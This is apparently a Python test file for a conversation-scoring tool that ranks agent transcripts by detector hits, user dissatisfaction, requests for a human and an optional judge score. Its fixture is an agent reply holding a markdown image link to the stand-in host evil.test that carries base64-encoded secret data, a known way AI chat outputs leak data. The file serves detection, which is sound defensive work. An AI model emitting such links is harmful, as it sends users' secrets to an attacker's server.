import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "checks"))

from check_helpers import Tb
from gauntlet_core.mining import DetectorSpec, score_conversation

EXFIL = "Here ![x](http://evil.test/p?d=c2VjcmV0LXZhbHVlLXN0cmluZw) done"
DETECTORS = [DetectorSpec(name="markdown_image_exfil"), DetectorSpec(name="profanity")]


async def score(tb, **kw):
    return await score_conversation(tb.events, DETECTORS, **kw)


async def test_a_detector_hit_outranks_a_clean_conversation():
    bad = Tb().user("hi").agent(EXFIL)
    clean = Tb().user("hi").agent("hello, how can I help")
    s_bad, s_clean = await score(bad), await score(clean)
    assert s_bad.total >= 0.6 and s_clean.total == 0.0
    assert s_bad.detector_hits == ["markdown_image_exfil"] and "detector" in s_bad.parts


async def test_parts_combine_without_exceeding_one_and_total_is_deterministic():
    tb = Tb().user("this is useless").agent("sorry").user("talk to a human").agent(EXFIL)
    a, b = await score(tb), await score(tb)
    assert a == b and 0.6 < a.total <= 1.0
    assert set(a.parts) >= {"detector", "dissatisfaction", "human_request"}
    assert a.total > (await score(Tb().user("hi").agent(EXFIL))).total


async def test_user_signals_alone_rank_below_a_detector_hit():
    soft = Tb().user("where is it").agent("a").user("where is it").agent("b")
    hard = Tb().agent(EXFIL)
    assert 0 < (await score(soft)).total < (await score(hard)).total


async def test_judge_only_counts_when_supplied_and_is_clamped():
    clean = Tb().user("hi").agent("hello")
    assert "judge" not in (await score(clean)).parts
    seen = []

    async def judge(events):
        seen.append(len(events))
        return 0.9

    s = await score(clean, judge=judge)
    assert seen == [2] and s.parts["judge"] == 0.9 and s.total > 0.5

    async def none(events):
        return None

    assert "judge" not in (await score(clean, judge=none)).parts

    async def big(events):
        return 7.0

    assert (await score(clean, judge=big)).parts["judge"] == 1.0
